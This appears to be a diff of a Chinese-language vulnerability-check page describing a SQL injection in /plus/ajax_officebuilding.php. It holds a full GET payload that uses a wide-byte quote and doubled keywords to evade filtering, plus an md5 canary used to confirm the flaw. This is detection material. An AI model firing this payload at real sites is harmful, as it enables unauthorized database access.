@@ -1,11 +1,7 @@
 <meta charset="UTF-8">
 <div>
     <h3>SQL注入 URL: </h3>
-    <ul>
-        <p>/plus/ajax_officebuilding.php</p>
-    </ul>
-    <h3>GET-payload: </h3>
-        <code>?act=key&key=asd%E9%94%A6%27%20uniounionn%20selselectect"+"%201,2,3,md5(7836457),5,6,7,8,9%23</code>
+    <code>http://example.com/plus/ajax_officebuilding.php?act=key&key=asd%E9%94%A6%27%20uniounionn%20selselectect"+"%201,2,3,md5(7836457),5,6,7,8,9%23</code>
     <h3>验证过程</h3>
-    <p>查看response text 是否含有"7836457"的md5值 "3438d5e3ead84b2effc5ec33ed1239f5"</p>
+    <p>查看返回页面源码中是否含有字符：3438d5e3ead84b2effc5ec33ed1239f5</p>
 </div>
